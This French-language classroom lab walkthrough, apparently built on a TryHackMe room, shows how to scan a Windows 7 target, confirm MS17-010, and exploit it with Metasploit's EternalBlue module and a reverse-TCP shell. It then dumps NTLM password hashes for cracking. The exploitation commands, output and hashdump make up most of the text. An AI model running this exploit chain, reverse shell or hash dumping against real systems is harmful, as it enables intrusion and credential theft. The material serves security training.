- Connectez-vous en SSH à votre poste d'attaque Kali
  (crédentiels fournis par l'instructeur)

```
sudo apt-get update
sudo apt-get install xrdp lxde-core lxde tigervnc-standalone-server -y
sudo nano /etc/xrdp/xrdp.ini
    max_bpp=16
sudo nano /etc/X11/Xwrapper.config
        allowed_users=ec2-user
sudo service xrdp start
sudo passwd kali 
```
- Connectez-vous en RDP à votre poste d'attaque Kali

```
ifconfig
```

- Pingez votre Machine THM

```
sudo apt install openvpn

sudo openvpn xixi.blue.ovpn&

ifconfig
```

- Quelle difference remarquez-vous dans ifconfig?

- Pingez à nouveau votre Machine THM

- Scannez la machine cible pour d'éventuelles vulenératibilité

```
nmap -sV -vv --script vuln TARGET_IP
```


```diff
@@Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 07:20 UTC@@
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:20
Completed NSE at 07:20, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:20
Completed NSE at 07:20, 0.00s elapsed
Initiating Ping Scan at 07:20
Scanning 10.10.18.88 [2 ports]
Completed Ping Scan at 07:20, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:20
Completed Parallel DNS resolution of 1 host. at 07:20, 0.00s elapsed
Initiating Connect Scan at 07:20
Scanning ip-10-10-18-88.ec2.internal (10.10.18.88) [1000 ports]
Discovered open port 139/tcp on 10.10.18.88
Discovered open port 3389/tcp on 10.10.18.88
Discovered open port 445/tcp on 10.10.18.88
Discovered open port 135/tcp on 10.10.18.88
Discovered open port 49158/tcp on 10.10.18.88
Discovered open port 49160/tcp on 10.10.18.88
Discovered open port 49152/tcp on 10.10.18.88
Discovered open port 49153/tcp on 10.10.18.88
Discovered open port 49154/tcp on 10.10.18.88
Completed Connect Scan at 07:20, 2.53s elapsed (1000 total ports)
Initiating Service scan at 07:20
@@Scanning 9 services on ip-10-10-18-88.ec2.internal (10.10.18.88)@@
```

- Les ports ouverts nous renseignent sur le type d'applications qui tournent

https://www.upguard.com/blog/smb-port#:~:text=SMB%20is%20a%20network%20file,dialects%20that%20communicate%20over%20NetBIOS.

- Lister les vulnerabilités potentielles de ce type

```
ls -al /usr/share/nmap/scripts | grep -e "smb"
```

- Vulnerabilité à exploiter : 

    https://en.wikipedia.org/wiki/EternalBlue

- Vérifier le satut de la vulnérabilité sur la machine cible : 

```
nmap -sS -Pn -p 445 10.10.18.88 --script smb-vuln-ms17-010.nse
```

```diff
@@Host script results:@@
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```
- Comprendre la vulnérabilité pour préparer l'attaque : 

References:
       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/. 
       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx. 
       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143. 

### Menez l'attaque exploit

- Prise en main de Metasploit

```
msfconsole -h
```

```
msfconsole
```

```diff                                    ____________
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
@@[%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]@@
@@[% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]@@
@@[% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]@@
@@[% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]@@
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
@@[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]@@
```

- Rechercher l'attaque

```
msf6 > search eternalblue
```

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

- Sélectionner l'attaque
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

- Configurer l'attaque

```
msf6 > exploit(windows/smb/ms17_010_eternalblue) > show options
```

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.30.2.112     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

- Quelles sont les options nécessaires pour la commande ?

```
set _OPTION_ _VALUE_
```

:mushroom: Hint : Le host local doit être adapté à l'interface créée par le VPN


- Préparer le payload pour enclencher un reverse shell en tcp

```
set payload windows/x64/shell/reverse_tcp
```

- Lancez l'attaque :rocket:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

```
[*] Started reverse TCP handler on 10.8.237.162:4444
[*] 10.10.214.31:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.10.214.31:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.214.31:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.214.31:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.214.31:445 - The target is vulnerable.
[*] 10.10.214.31:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.214.31:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.214.31:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.214.31:445 - Connecting to target for exploitation.
[+] 10.10.214.31:445 - Connection established for exploitation.
[+] 10.10.214.31:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.214.31:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.214.31:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.214.31:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.214.31:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.214.31:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.214.31:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.214.31:445 - Sending all but last fragment of exploit packet
[*] 10.10.214.31:445 - Starting non-paged pool grooming
[+] 10.10.214.31:445 - Sending SMBv2 buffers
[+] 10.10.214.31:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.214.31:445 - Sending final SMBv2 buffers.
[*] 10.10.214.31:445 - Sending last fragment of exploit packet!
[*] 10.10.214.31:445 - Receiving response from exploit packet
[+] 10.10.214.31:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.214.31:445 - Sending egg to corrupted connection.
[*] 10.10.214.31:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.214.31
[*] Meterpreter session 1 opened (10.8.237.162:4444 -> 10.10.214.31:49199) at 2021-09-13 10:32:39 +0000
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Félicitations, vous avez pénétré la machine cible :raised_hands:

- Lancez un shell windows

```
meterpreter > shell
Process 2184 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Ctrl-C pour sortir 

revenir en background sur MSF et explorer les sessions en cours
```
meterpreter > background (ou Ctrl-Z) 
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.237.162:4444 -> 10.10.214.31:49199 (10.10.214.31)
```

- Retourner sur la session
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 1
```

- Basculer à nouveau sur le shell et vérifier que l'attaque d'escalation a réussi

```
meterpreter > shell
Process 2768 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

CTrl-C
```

- Confirmer avec le meterpreter

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- Lister les processus qui tournent sur la machine cible

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 520   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 584   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 688   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 696   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 704   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 808   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 876   688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 928   688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 992   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1064  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1144  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1332  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1400  688   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1472  688   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1584  688   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1824  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1876  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2032  808   WmiPrvSE.exe
 2548  688   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2808  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2836  688   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2872  688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2956  688   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 
 ```
 
- Migrer l'interpreteur vers le processus winlogon.exe pour plus de stabilité
 (utiliser la commande MIGRATE)
 Quel était le processus vérolé par l'interpreteur avant migration ? 

# Post-exploit : Récupération de crédentiels en mémoire

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
 
 - Récupérer le 2ème hash de Jon et essayer de le reverser avec crakstation.com ou l'utilitaire John the Ripper sur Kali

 
 
